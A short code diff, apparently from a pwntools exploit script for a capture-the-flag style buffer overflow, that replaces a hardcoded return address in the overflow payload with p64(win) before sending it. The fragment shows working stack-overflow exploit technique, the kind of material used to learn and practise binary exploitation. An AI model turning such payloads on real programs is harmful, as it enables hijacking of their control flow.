@@ -34,7 +34,7 @@ for i in range(8):
     payload += b"\x00"
 
 # return address (little endian)
-payload += b"\x36\x12\x40\x00\x00\x00\x00\x00"
+payload += p64(win)
 
 r.sendline(payload)
 
